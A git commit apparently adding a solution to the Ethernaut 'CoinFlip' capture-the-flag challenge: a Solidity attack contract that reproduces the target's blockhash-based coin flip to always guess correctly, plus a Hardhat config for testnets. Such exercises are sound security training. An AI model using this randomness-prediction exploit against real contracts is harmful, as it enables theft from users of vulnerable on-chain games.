4b302d73a6f2c3eb742f50bad1fede0f67f01f02
Armando Andini <armando.andini@gmail.com>
2021-11-25 15:24:39 -0300

    Ethernaut challenge 3: CoinFlip

---
+++ ethernaut_challenges/contracts/3_CoinFlipAttack.sol
@@ -0,0 +1,31 @@
+pragma solidity ^0.6.0;
+
+import "./3_CoinFlip.sol";
+import "@openzeppelin/contracts/math/SafeMath.sol";
+
+contract CoinFlipAttack {
+  using SafeMath for uint256;
+
+  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  CoinFlip public target;
+  uint256 lastBlockNumberRun;
+
+  event CurrentWins(uint256 indexed wins);
+
+  constructor(CoinFlip _target) public {
+    target = _target;
+  }
+
+  function guess() public {
+    require(block.number > lastBlockNumberRun, "Already ran this block!");
+    lastBlockNumberRun = block.number;
+
+    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
+    uint256 coinFlip = blockValue.div(FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    target.flip(side);
+    emit CurrentWins(target.consecutiveWins());
+  }
+}
---
+++ ethernaut_challenges/hardhat.config.ts
@@ -0,0 +1,61 @@
+import "@atixlabs/hardhat-time-n-mine";
+import "@atixlabs/hardhat-time-n-mine/dist/src/type-extensions";
+import "@nomiclabs/hardhat-waffle";
+import dotenv from "dotenv";
+import "hardhat-gas-reporter";
+import "hardhat-tracer";
+import { task } from "hardhat/config";
+
+dotenv.config();
+
+// This is a sample Hardhat task. To learn how to create your own go to
+// https://hardhat.org/guides/create-task.html
+task("accounts", "Prints the list of accounts", async (args, hre) => {
+  const accounts = await hre.ethers.getSigners();
+
+  for (const account of accounts) {
+    console.log(await account.address);
+  }
+});
+
+// You need to export an object to set up your config
+// Go to https://hardhat.org/config/ to learn more
+
+export default {
+  solidity: {
+    compilers: [
+      {
+        version: "0.8.7",
+        settings: {
+          outputSelection: {
+            "*": {
+              "*": ["storageLayout"],
+            },
+          },
+        },
+      },
+      {
+        version: "0.6.0",
+        settings: {
+          outputSelection: {
+            "*": {
+              "*": ["storageLayout"],
+            },
+          },
+        },
+      },
+    ],
+  },
+  networks: {
+    ropsten: {
+      url: `https://eth-ropsten.alchemyapi.io/v2/${process.env.ALCHEMY_API_KEY}`,
+      accounts:
+        process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
+    },
+    rinkeby: {
+      url: `https://eth-rinkeby.alchemyapi.io/v2/${process.env.ALCHEMY_API_KEY}`,
+      accounts:
+        process.env.PRIVATE_KEY !== undefined ? [process.env.PRIVATE_KEY] : [],
+    },
+  },
+};
